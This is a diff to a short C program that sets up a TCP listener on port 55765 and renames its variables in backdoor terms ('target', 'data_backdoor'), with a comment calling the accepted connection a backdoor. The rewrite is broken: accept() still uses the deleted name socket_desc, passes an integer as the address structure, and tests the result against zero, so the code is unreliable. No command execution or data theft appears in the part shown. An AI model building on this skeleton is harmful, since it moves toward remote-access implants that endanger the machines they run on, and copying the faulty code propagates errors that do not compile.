@@ -11,21 +11,22 @@
 #define true 1
 #define false 0
 
-#define port 55765
+#define remote_port 55765
+#define remote_target INADDR_ANY
 
 int main(int argc, char **argv[])
 
 {
-    int socket_desc, client_sock, c, read_size;
+    int target, target_sock, c, read_size;
 
     struct sockaddr_in server, client;
 
-    char client_message[2000];
+    char data_backdoor[2000];
 
     //Create socket
 
-    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
-    if (socket_desc == -1)
+    target = socket(AF_INET , SOCK_STREAM , 0);
+    if (target == -1)
 
     {
         perror("Could not create socket");
@@ -38,12 +39,12 @@ int main(int argc, char **argv[])
 
     memset(server.sin_zero, '\0', sizeof server.sin_zero); /*aloca espaço de memória para o PIPE socket. */
     server.sin_family = AF_INET;
-    server.sin_addr.s_addr = INADDR_ANY;
-    server.sin_port = htons(port); /* port allready defined */
+    server.sin_addr.s_addr = (remote_target);
+    server.sin_port = htons(remote_port); /* port allready defined */
 
     //Bind
 
-    if( bind(socket_desc,(struct sockaddr *)&server , sizeof(server)) < 0)
+    if( bind(target,(struct sockaddr *)&server , sizeof(server)) < 0)
     {
         //print the error message
 
@@ -56,7 +57,7 @@ int main(int argc, char **argv[])
 
     //Listen
 
-    listen(socket_desc , 10);
+    listen(target, 10);
 
     //Accept and incoming connection
 
@@ -65,9 +66,9 @@ int main(int argc, char **argv[])
 
     //accept connection from an incoming client (backdoor)
 
-    client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);
+    target_sock = accept(socket_desc, (struct sockaddr *)&target, (socklen_t*)&c);
 
-    if (client_sock  == false)
+    if (target_sock  == false)
 
     {
         perror("accept failed");
@@ -75,7 +76,6 @@ int main(int argc, char **argv[])
 
     }
 
-//  if (connect == true)
     puts("Connection accepted");
 
     }
